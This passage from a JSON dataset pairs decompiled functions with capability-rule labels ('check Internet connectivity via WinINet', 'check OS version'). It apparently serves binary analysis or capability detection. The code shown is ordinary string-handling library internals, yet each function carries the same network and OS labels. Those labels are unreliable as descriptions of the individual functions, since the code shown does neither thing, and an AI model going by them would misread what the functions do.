uVar1 & 0xffffffff | (arg_ch & 0xffff0000 | uVar1 >> 0x20 & 0xffff) << 0x20;\n}\n",
        "token_count": 405
    },
    "00483230": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00483230(int32_t param_1, ushort param_2, uint param_3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    piVar1 = fcn.004838f0(param_1, 0, param_3);\n    piVar2 = piVar1 + 3;\n    if (param_1 != 0) {\n        iVar3 = param_1;\n        if (param_1 == 1) {\n            *(piVar1 + 3) = param_2;\n        }\n        else {\n            do {\n                *piVar2 = param_2;\n                piVar2 = piVar2 + 2;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    piVar1[2] = 0;\n    *piVar1 = param_1;\n    *(piVar1 + param_1 * 2 + 0xc) = 0;\n    return;\n}\n",
        "token_count": 231
    },
    "00483320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.00483320(ushort *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ushort *in_stack_ffffffc8;\n    int32_t in_stack_ffffffcc;\n    uint uStack48;\n    \n    if ((param_2 == 0) || (param_1 != NULL)) {\n        param_2 = param_2 - param_1;\n        iVar2 = param_2 >> 1;\n        piVar1 = fcn.004838f0(iVar2, 0, param_3);\n        if (iVar2 == 1) {\n            *(piVar1 + 3) = *param_1;\n        }\n        else if (iVar2 != 0) {\n            sub.msvcrt.dll_memcpy(piVar1 + 3, param_1, param_2);\n        }\n        piVar1[2] = 0;\n        *piVar1 = iVar2;\n        *(piVar1 + param_2 + 0xc) = 0;\n        return piVar1 + 3;\n    }\n    fcn.004be210(\"basic_string::_S_construct null not valid\");\n    if ((in_stack_ffffffcc != 0) && (in_stack_ffffffc8 == NULL)) {\n        fcn.004be210(\"basic_string::_S_construct null not valid\");\n        return 0x516d80;\n    }\n    in_stack_ffffffcc = in_stack_ffffffcc - in_stack_ffffffc8;\n    iVar2 = in_stack_ffffffcc >> 1;\n    piVar1 = fcn.004838f0(iVar2, 0, uStack48);\n    if (iVar2 == 1) {\n        *(piVar1 + 3) = *in_stack_ffffffc8;\n    }\n    else if (iVar2 != 0) {\n        sub.msvcrt.dll_memcpy(piVar1 + 3, in_stack_ffffffc8, in_stack_ffffffcc);\n    }\n    piVar1[2] = 0;\n    *piVar1 = iVar2;\n    *(piVar1 + in_stack_ffffffcc + 0xc) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 496
    },
    "004835b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004835b0(int32_t *param_1, uint param_2, int32_t param_3, uint32_t param_4, ushort param_5)\n\n{\n    ushort *puVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EDI;\n    ushort *puVar2;\n    int32_t in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    int32_t iStack28;\n    \n    if ((param_3 + 0x1ffffffe) - *(*param_1 + -0xc) < param_4) {\n        puVar2 = 0x523be9;\n        fcn.004be310();\n        fcn.00484ce0(in_stack_ffffffd8, in_stack_ffffffdc, iStack28);\n        if (iStack28 != 0) {\n            puVar1 = *extraout_ECX + in_stack_ffffffd8 * 2;\n            if (iStack28 == 1) {\n                *puVar1 = *puVar2;\n                return extraout_ECX;\n            }\n            sub.msvcrt.dll_memcpy(puVar1, puVar2, iStack28 * 2);\n        }\n        return extraout_ECX;\n    }\n    fcn.00484ce0(param_2, param_3, param_4);\n    if (param_4 != 0) {\n        puVar2 = *param_1 + unaff_EDI * 2;\n        if (param_4 == 1) {\n            *puVar2 = param_5;\n            return param_1;\n        }\n        do {\n            *puVar2 = param_5;\n            puVar2 = puVar2 + 1;\n            param_4 = param_4 - 1;\n        } while (param_4 != 0);\n    }\n    return param_1;\n}\n",
        "token_count": 416
    },
    "00483640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00483640(int32_t *param_1, int32_t param_2, uint param_3, uint param_4, int32_t param_5)\n\n{\n    ushort *puVar1;\n    ushort *unaff_retaddr;\n    \n    fcn.00484ce0(param_2, param_3, param_5);\n    if (param_5 != 0) {\n        puVar1 = *param_1 + param_2 * 2;\n        if (param_5 == 1) {\n            *puVar1 = *unaff_retaddr;\n            return param_1;\n        }\n        sub.msvcrt.dll_memcpy(puVar1, unaff_retaddr, param_5 * 2);\n    }\n    return param_1;\n}\n",
        "token_count": 175
    },
    "00483870": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00483870(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    piVar1 = fcn.004838f0(*param_1 + param_3, param_1[1], param_2);\n    iVar3 = 0;\n    iVar2 = *param_1;\n    if (iVar2 != 0) {\n        if (iVar2 == 1) {\n            *(piVar1 + 3) = *(param_1 + 3);\n            iVar3 = 2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(piVar1 + 3, param_1 + 3, iVar2 * 2);\n            iVar2 = *param_1;\n            iVar3 = iVar2 * 2;\n        }\n    }\n    *piVar1 = iVar2;\n    piVar1[2] = 0;\n    *(piVar1 + iVar3 + 0xc) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 253
    },
    "00483f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00483f40(int32_t *param_1, ushort *param_2, uint32_t param_3)\n\n{\n    ushort *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar auStack57 [5];\n    uint32_t uStack52;\n    int32_t iStack48;\n    ushort *puStack44;\n    int32_t *piStack40;\n    ushort *puStack36;\n    uint32_t uStack32;\n    int32_t *piStack16;\n    \n    puVar1 = *param_1;\n    iVar5 = *(puVar1 + -6);\n    if (0x1ffffffe < param_3) {\n        puStack44 = 0x523c31;\n        iStack48 = 0x484034;\n        fcn.004be310();\n        uStack52 = param_3;\n        iVar3 = *piStack40;\n        if (*extraout_ECX != iVar3) {\n            iStack48 = iVar5;\n            if (*(iVar3 + -4) < 0) {\n                iVar3 = fcn.00483870(&stack0xffffffc7, 0);\n                iVar5 = *extraout_ECX;\n            }\n            else {\n                if (*0x515a34 == 0) {\n                    *(iVar3 + -4) = *(iVar3 + -4) + 1;\n                }\n                else {\n                    LOCK();\n                    *(iVar3 + -4) = *(iVar3 + -4) + 1;\n                }\n                iVar5 = *extraout_ECX;\n            }\n            if (*0x515a34 == 0) {\n                iVar4 = *(iVar5 + -4);\n                *(iVar5 + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar2 = iVar5 + -4;\n                iVar4 = *piVar2;\n                *piVar2 = *piVar2 + -1;\n            }\n            if (iVar4 < 1) {\n                fcn.004c2c30(iVar5 + -0xc);\n                *extraout_ECX = iVar3;\n            }\n            else {\n                *extraout_ECX = iVar3;\n            }\n            return extraout_ECX;\n        }\n        return extraout_ECX;\n    }\n    if ((param_2 < puVar1) || (puVar1 + iVar5 < param_2)) {\ncode_r0x00483f63:\n        uStack32 = param_3;\n        puStack36 = param_2;\n        puStack44 = NULL;\n        iStack48 = 0x483f7b;\n        piStack40 = iVar5;\n        piVar2 = fcn.00483640();\n        return piVar2;\n    }\n    puStack44 = *param_1;\n    if (0 < *(puVar1 + -2)) {\n        iVar5 = *(puStack44 + -6);\n        goto code_r0x00483f63;\n    }\n    puStack36 = param_3 * 2;\n    uVar6 = param_2 - puStack44 >> 1;\n    piStack16 = param_1;\n    if (uVar6 < param_3) {\n        if (uVar6 == 0) goto code_r0x00483fe0;\n        if (param_3 != 1) {\n            if (param_3 != 0) {\n                piStack40 = param_2;\n                iStack48 = 0x483fd3;\n                sub.msvcrt.dll_memmove();\n                puStack44 = *piStack16;\n                param_1 = piStack16;\n            }\n            goto code_r0x00483fe0;\n        }\n    }\n    else if (param_3 != 1) {\n        if (param_3 != 0) {\n            piStack40 = param_2;\n            iStack48 = 0x484011;\n            sub.msvcrt.dll_memcpy();\n            puStack44 = *piStack16;\n            param_1 = piStack16;\n        }\n        goto code_r0x00483fe0;\n    }\n    *puStack44 = *param_2;\ncode_r0x00483fe0:\n    *(puStack44 + -2) = 0;\n    *(puStack44 + -6) = param_3;\n    puStack44[param_3] = 0;\n    return param_1;\n}\n",
        "token_count": 998
    },
    "004848b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint32_t * __cdecl fcn.004848b0(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    ushort *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t *in_ECX;\n    uint32_t uVar8;\n    int32_t *extraout_EDX;\n    int32_t iVar9;\n    uint *arg_8h_00;\n    uint arg_ch_00;\n    uint32_t in_stack_ffffffc0;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    uVar2 = *in_ECX;\n    piVar3 = *(uVar2 - 0xc);\n    if (arg_8h <= piVar3) {\n        if (piVar3 - arg_8h <= arg_ch) {\n            arg_ch = piVar3 - arg_8h;\n        }\n        if (arg_14h <= (arg_ch - piVar3) + 0x1ffffffe) {\n            if (((arg_10h < uVar2) || (uVar2 + piVar3 * 2 < arg_10h)) || (0 < *(uVar2 - 4))) {\n                in_ECX = fcn.00483640(arg_8h, arg_ch, arg_10h, arg_14h);\n            }\n            else {\n                uVar8 = arg_10h + arg_14h * 2;\n                uVar2 = *in_ECX;\n                if (arg_8h * 2 + uVar2 < uVar8) {\n                    if (arg_10h < uVar2 + (arg_8h + arg_ch) * 2) {\n                        iVar9 = fcn.00483320(arg_10h, uVar8, &var_19h, in_stack_ffffffc0 & 0xffffff00);\n                        puVar5 = fcn.00483640(arg_8h, arg_ch, iVar9, arg_14h);\n                        if (*0x515a34 == 0) {\n                            iVar6 = *(iVar9 + -4);\n                            *(iVar9 + -4) = iVar6 + -1;\n                        }\n                        else {\n                            LOCK();\n                            piVar3 = iVar9 + -4;\n                            iVar6 = *piVar3;\n                            *piVar3 = *piVar3 + -1;\n                        }\n                        if (0 < iVar6) {\n                            return puVar5;\n                        }\n                        fcn.004c2c30(iVar9 + -0xc);\n                        return puVar5;\n                    }\n                    iVar9 = (arg_14h + (arg_10h - uVar2 >> 1)) - arg_ch;\n                }\n                else {\n                    iVar9 = arg_10h - uVar2 >> 1;\n                }\n                fcn.00484ce0(arg_8h, arg_ch, arg_14h);\n                puVar1 = *in_ECX + iVar9 * 2;\n                puVar4 = *in_ECX + arg_8h * 2;\n                if (arg_14h == 1) {\n                    *puVar4 = *puVar1;\n                }\n                else if (arg_14h != 0) {\n                    sub.msvcrt.dll_memcpy(puVar4, puVar1, arg_14h * 2);\n                }\n            }\n            return in_ECX;\n        }\n        fcn.004be310(0x523c1b);\n        arg_8h = extraout_EDX;\n    }\n    arg_ch_00 = 0x523c1b;\n    uVar7 = fcn.004be900(0x523b18, 0x523c1b);\n    arg_8h_00 = &var_19h;\n    fcn.00483770();\n    fcn.0043a8e0(uVar7);\n    puVar5 = fcn.004848b0(arg_8h_00, arg_ch_00, *arg_8h, *(*arg_8h + -0xc));\n    return puVar5;\n}\n",
        "token_count": 974
    },
    "00484ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00484ce0(int32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uchar auStack29 [13];\n    \n    iVar9 = *param_1;\n    iVar5 = param_2 + param_3;\n    uVar6 = (param_4 - param_3) + *(iVar9 + -0xc);\n    iVar7 = *(iVar9 + -0xc) - iVar5;\n    uVar8 = *(iVar9 + -8);\n    if (uVar6 <= uVar8) {\n        if (*(iVar9 + -4) < 1) {\n            iVar9 = *param_1;\n            if ((iVar7 != 0) && (param_4 != param_3)) {\n                puVar4 = iVar9 + iVar5 * 2;\n                puVar2 = iVar9 + (param_4 + param_2) * 2;\n                if (iVar7 == 1) {\n                    *puVar2 = *puVar4;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar2, puVar4, iVar7 * 2);\n                    iVar9 = *param_1;\n                }\n            }\n            goto code_r0x00484da5;\n        }\n        uVar8 = *(*param_1 + -8);\n    }\n    iVar3 = fcn.004838f0(uVar6, uVar8, auStack29);\n    if (param_2 == 0) {\n        puVar4 = *param_1;\n    }\n    else {\n        puVar4 = *param_1;\n        if (param_2 == 1) {\n            *(iVar3 + 0xc) = *puVar4;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(iVar3 + 0xc, puVar4, param_2 * 2);\n            puVar4 = *param_1;\n        }\n    }\n    iVar9 = iVar3 + 0xc;\n    if (iVar7 != 0) {\n        puVar2 = iVar3 + 0xc + (param_4 + param_2) * 2;\n        if (iVar7 == 1) {\n            *puVar2 = puVar4[iVar5];\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar2, puVar4 + iVar5, iVar7 * 2);\n            puVar4 = *param_1;\n        }\n    }\n    if (*0x515a34 == 0) {\n        iVar5 = *(puVar4 + -2);\n        *(puVar4 + -2) = iVar5 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = puVar4 + -2;\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar5 < 1) {\n        fcn.004c2c30(puVar4 + -6);\n    }\n    *param_1 = iVar9;\ncode_r0x00484da5:\n    *(iVar9 + -4) = 0;\n    *(iVar9 + -0xc) = uVar6;\n    *(iVar9 + uVar6 * 2) = 0;\n    return;\n}\n",
        "token_count": 791
    },
    "004878b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004878b0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    uint var_19h;\n    uint var_14h;\n    uint var_bp_10h;\n    uint var_8h;\n    \n    *in_ECX = 0xffffffff;\n    in_ECX[1] = 0xffffffff;\n    in_ECX[2] = 0;\n    fcn.00487fd0(arg_8h, 1);\n    if ((var_19h != '\\0') && ((*(arg_8h + *(*arg_8h + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(arg_8h + *(*arg_8h + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, 0, 0, 1, 8);\n        *in_ECX = stack0xffffffe4;\n        in_ECX[1] = var_14h;\n        in_ECX[2] = var_bp_10h;\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "0048b140": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.0048b140(int32_t param_1, char param_2, uint param_3)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.0048b7a0(param_1, 0, param_3);\n    if (param_1 != 0) {\n        if (param_1 == 1) {\n            *(piVar1 + 3) = param_2;\n        }\n        else {\n            sub.msvcrt.dll_memset(piVar1 + 3, param_2, param_1);\n        }\n    }\n    piVar1[2] = 0;\n    *piVar1 = param_1;\n    *(piVar1 + param_1 + 0xc) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 182
    },
    "0048b220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.0048b220(uchar *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t *piVar1;\n    uchar *in_stack_ffffffd8;\n    int32_t in_stack_ffffffdc;\n    uint uStack32;\n    \n    if ((param_2 == 0) || (param_1 != NULL)) {\n        param_2 = param_2 - param_1;\n        piVar1 = fcn.0048b7a0(param_2, 0, param_3);\n        if (param_2 == 1) {\n            *(piVar1 + 3) = *param_1;\n        }\n        else if (param_2 != 0) {\n            sub.msvcrt.dll_memcpy(piVar1 + 3, param_1, param_2);\n        }\n        piVar1[2] = 0;\n        *piVar1 = param_2;\n        *(piVar1 + param_2 + 0xc) = 0;\n        return piVar1 + 3;\n    }\n    fcn.004be210(0x523a60);\n    if ((in_stack_ffffffdc != 0) && (in_stack_ffffffd8 == NULL)) {\n        fcn.004be210(0x523a60);\n        return 0x516d90;\n    }\n    in_stack_ffffffdc = in_stack_ffffffdc - in_stack_ffffffd8;\n    piVar1 = fcn.0048b7a0(in_stack_ffffffdc, 0, uStack32);\n    if (in_stack_ffffffdc == 1) {\n        *(piVar1 + 3) = *in_stack_ffffffd8;\n    }\n    else if (in_stack_ffffffdc != 0) {\n        sub.msvcrt.dll_memcpy(piVar1 + 3, in_stack_ffffffd8, in_stack_ffffffdc);\n    }\n    piVar1[2] = 0;\n    *piVar1 = in_stack_ffffffdc;\n    *(piVar1 + in_stack_ffffffdc + 0xc) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 478
    },
    "0048b490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0048b490(int32_t *param_1, int32_t param_2, int32_t param_3, uint32_t param_4, char param_5)\n\n{\n    int32_t *extraout_ECX;\n    uchar *puVar1;\n    int32_t in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    int32_t iStack28;\n    \n    if ((param_3 + 0x3ffffffc) - *(*param_1 + -0xc) < param_4) {\n        puVar1 = 0x5239d9;\n        fcn.004be310();\n        fcn.0048ca60(in_stack_ffffffd8, in_stack_ffffffdc, iStack28);\n        if (iStack28 != 0) {\n            if (iStack28 == 1) {\n                *(in_stack_ffffffd8 + *extraout_ECX) = *puVar1;\n                return extraout_ECX;\n            }\n            sub.msvcrt.dll_memcpy(in_stack_ffffffd8 + *extraout_ECX, puVar1, iStack28);\n        }\n        return extraout_ECX;\n    }\n    fcn.0048ca60(param_2, param_3, param_4);\n    if (param_4 != 0) {\n        if (param_4 == 1) {\n            *(param_2 + *param_1) = param_5;\n            return param_1;\n        }\n        sub.msvcrt.dll_memset(param_2 + *param_1, param_5, param_4);\n    }\n    return param_1;\n}\n",
        "token_count": 362
    },
    "0048b520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0048b520(int32_t *param_1, int32_t param_2, uint param_3, uint param_4, int32_t param_5)\n\n{\n    uchar *unaff_retaddr;\n    \n    fcn.0048ca60(param_2, param_3, param_5);\n    if (param_5 != 0) {\n        if (param_5 == 1) {\n            *(param_2 + *param_1) = *unaff_retaddr;\n            return param_1;\n        }\n        sub.msvcrt.dll_memcpy(param_2 + *param_1, unaff_retaddr, param_5);\n    }\n    return param_1;\n}\n",
        "token_count": 159
    },
    "0048b730": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0048b730(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.0048b7a0(*param_1 + param_3, param_1[1], param_2);\n    iVar2 = *param_1;\n    if (iVar2 != 0) {\n        if (iVar2 == 1) {\n            *(piVar1 + 3) = *(param_1 + 3);\n            iVar2 = *param_1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(piVar1 + 3, param_1 + 3, iVar2);\n            iVar2 = *param_1;\n        }\n    }\n    *piVar1 = iVar2;\n    piVar1[2] = 0;\n    *(piVar1 + iVar2 + 0xc) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 231
    },
    "0048bda0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0048bda0(int32_t *param_1, uchar *param_2, uint32_t param_3)\n\n{\n    uchar *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar auStack57 [5];\n    uint32_t uStack52;\n    int32_t iStack48;\n    uchar *puStack44;\n    int32_t *piStack40;\n    uchar *puStack36;\n    uint32_t uStack32;\n    int32_t *piStack16;\n    \n    puVar1 = *param_1;\n    iVar5 = *(puVar1 + -0xc);\n    if (0x3ffffffc < param_3) {\n        puStack44 = 0x523a21;\n        iStack48 = 0x48be85;\n        fcn.004be310();\n        uStack52 = param_3;\n        iVar3 = *piStack40;\n        if (*extraout_ECX != iVar3) {\n            iStack48 = iVar5;\n            if (*(iVar3 + -4) < 0) {\n                iVar3 = fcn.0048b730(&stack0xffffffc7, 0);\n                iVar5 = *extraout_ECX;\n            }\n            else {\n                if (*0x515a34 == 0) {\n                    *(iVar3 + -4) = *(iVar3 + -4) + 1;\n                }\n                else {\n                    LOCK();\n                    *(iVar3 + -4) = *(iVar3 + -4) + 1;\n                }\n                iVar5 = *extraout_ECX;\n            }\n            if (*0x515a34 == 0) {\n                iVar4 = *(iVar5 + -4);\n                *(iVar5 + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar2 = iVar5 + -4;\n                iVar4 = *piVar2;\n                *piVar2 = *piVar2 + -1;\n            }\n            if (iVar4 < 1) {\n                fcn.004c2c30(iVar5 + -0xc);\n                *extraout_ECX = iVar3;\n            }\n            else {\n                *extraout_ECX = iVar3;\n            }\n            return extraout_ECX;\n        }\n        return extraout_ECX;\n    }\n    if ((param_2 < puVar1) || (puVar1 + iVar5 < param_2)) {\ncode_r0x0048bdc3:\n        uStack32 = param_3;\n        puStack36 = param_2;\n        puStack44 = NULL;\n        iStack48 = 0x48bddb;\n        piStack40 = iVar5;\n        piVar2 = fcn.0048b520();\n        return piVar2;\n    }\n    puStack44 = *param_1;\n    if (0 < *(puVar1 + -4)) {\n        iVar5 = *(puStack44 + -0xc);\n        goto code_r0x0048bdc3;\n    }\n    piStack16 = param_1;\n    if (param_2 - puStack44 < param_3) {\n        if (param_2 == puStack44) goto code_r0x0048be30;\n        if (param_3 != 1) {\n            puStack36 = param_3;\n            piStack40 = param_2;\n            iStack48 = 0x48be2a;\n            sub.msvcrt.dll_memmove();\n            puStack44 = *piStack16;\n            param_1 = piStack16;\n            goto code_r0x0048be30;\n        }\n    }\n    else if (param_3 != 1) {\n        if (param_3 != 0) {\n            puStack36 = param_3;\n            piStack40 = param_2;\n            iStack48 = 0x48be5f;\n            sub.msvcrt.dll_memcpy();\n            puStack44 = *piStack16;\n            param_1 = piStack16;\n        }\n        goto code_r0x0048be30;\n    }\n    *puStack44 = *param_2;\n    puStack44 = *param_1;\ncode_r0x0048be30:\n    *(puStack44 + -4) = 0;\n    *(puStack44 + -0xc) = param_3;\n    puStack44[param_3] = 0;\n    return param_1;\n}\n",
        "token_count": 993
    },
    "0048c640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint32_t * __cdecl fcn.0048c640(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t *in_ECX;\n    uchar *puVar8;\n    uint *arg_8h_00;\n    uint arg_ch_00;\n    uint32_t in_stack_ffffffc0;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    uVar1 = *in_ECX;\n    piVar2 = *(uVar1 - 0xc);\n    if (arg_8h <= piVar2) {\n        if (piVar2 - arg_8h <= arg_ch) {\n            arg_ch = piVar2 - arg_8h;\n        }\n        if (arg_14h <= (arg_ch - piVar2) + 0x3ffffffc) {\n            if (((arg_10h < uVar1) || (piVar2 + uVar1 < arg_10h)) || (0 < *(uVar1 - 4))) {\n                in_ECX = fcn.0048b520(arg_8h, arg_ch, arg_10h, arg_14h);\n            }\n            else {\n                uVar1 = *in_ECX;\n                if (uVar1 + arg_8h < arg_10h + arg_14h) {\n                    if (arg_10h < arg_8h + uVar1 + arg_ch) {\n                        iVar4 = fcn.0048b220(arg_10h, arg_10h + arg_14h, &var_19h, in_stack_ffffffc0 & 0xffffff00);\n                        puVar5 = fcn.0048b520(arg_8h, arg_ch, iVar4, arg_14h);\n                        if (*0x515a34 == 0) {\n                            iVar6 = *(iVar4 + -4);\n                            *(iVar4 + -4) = iVar6 + -1;\n                        }\n                        else {\n                            LOCK();\n                            piVar2 = iVar4 + -4;\n                            iVar6 = *piVar2;\n                            *piVar2 = *piVar2 + -1;\n                        }\n                        if (0 < iVar6) {\n                            return puVar5;\n                        }\n                        fcn.004c2c30(iVar4 + -0xc);\n                        return puVar5;\n                    }\n                    var_2ch = ((arg_10h - uVar1) + arg_14h) - arg_ch;\n                }\n                else {\n                    var_2ch = arg_10h - uVar1;\n                }\n                fcn.0048ca60(arg_8h, arg_ch, arg_14h);\n                puVar3 = var_2ch + *in_ECX;\n                puVar8 = arg_8h + *in_ECX;\n                if (arg_14h == 1) {\n                    *puVar8 = *puVar3;\n                }\n                else if (arg_14h != 0) {\n                    sub.msvcrt.dll_memcpy(puVar8, puVar3, arg_14h);\n                }\n            }\n            return in_ECX;\n        }\n        fcn.004be310(0x523a0b);\n    }\n    arg_ch_00 = 0x523a0b;\n    uVar7 = fcn.004be900(0x523908, 0x523a0b);\n    arg_8h_00 = &var_19h;\n    fcn.0048b630();\n    fcn.0043a8e0(uVar7);\n    puVar5 = fcn.0048c640(arg_8h_00, arg_ch_00, *arg_8h, *(*arg_8h + -0xc));\n    return puVar5;\n}\n",
        "token_count": 917
    },
    "0048ca60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
